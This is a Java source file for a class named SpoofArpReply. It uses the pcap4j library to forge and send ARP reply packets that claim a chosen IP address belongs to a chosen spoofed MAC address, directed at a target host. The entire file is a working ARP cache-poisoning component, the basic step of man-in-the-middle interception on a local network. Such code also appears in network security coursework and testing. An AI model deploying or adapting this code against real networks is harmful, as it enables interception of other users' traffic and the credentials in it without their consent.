package proto.sender;

import org.pcap4j.core.PcapHandle;
import org.pcap4j.packet.ArpPacket;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.ArpHardwareType;
import org.pcap4j.packet.namednumber.ArpOperation;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.ByteArrays;
import org.pcap4j.util.MacAddress;

import java.net.InetAddress;

public class SpoofArpReply implements  Runnable {

    private PcapHandle sendHandle;
    private MacAddress spoofMacAddress;
    private InetAddress spoofIpAddress;
    private InetAddress receiverIpAddress;
    private MacAddress receiverMacAddress;

    public SpoofArpReply(PcapHandle sendHandle, MacAddress spoofMacAddress, InetAddress spoofIpAddress) {
        this.sendHandle = sendHandle;
        this.spoofMacAddress = spoofMacAddress;
        this.spoofIpAddress = spoofIpAddress;
    }

    @Override
    public void run() {
        try {
            sendArpReply();
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }
    }

    private void  sendArpReply() throws Exception {
        ArpPacket.Builder arpBuilder = new ArpPacket.Builder();
        arpBuilder
                .hardwareType(ArpHardwareType.ETHERNET)
                .protocolType(EtherType.IPV4)
                .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
                .protocolAddrLength((byte) ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES)
                .operation(ArpOperation.REPLY)
                .srcHardwareAddr(spoofMacAddress)
                .srcProtocolAddr(spoofIpAddress)
                .dstHardwareAddr(receiverMacAddress)
                .dstProtocolAddr(receiverIpAddress);

        EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder();
        etherBuilder.dstAddr(receiverMacAddress)
                .srcAddr(spoofMacAddress)
                .type(EtherType.ARP)
                .payloadBuilder(arpBuilder)
                .paddingAtBuild(true);

        Packet packet = etherBuilder.build();
        sendHandle.sendPacket(packet);
    }


    public void setReceivers(InetAddress theRreceiverIp, MacAddress theReceiverMac){
        receiverIpAddress = theRreceiverIp;
        receiverMacAddress = theReceiverMac;
    }
}
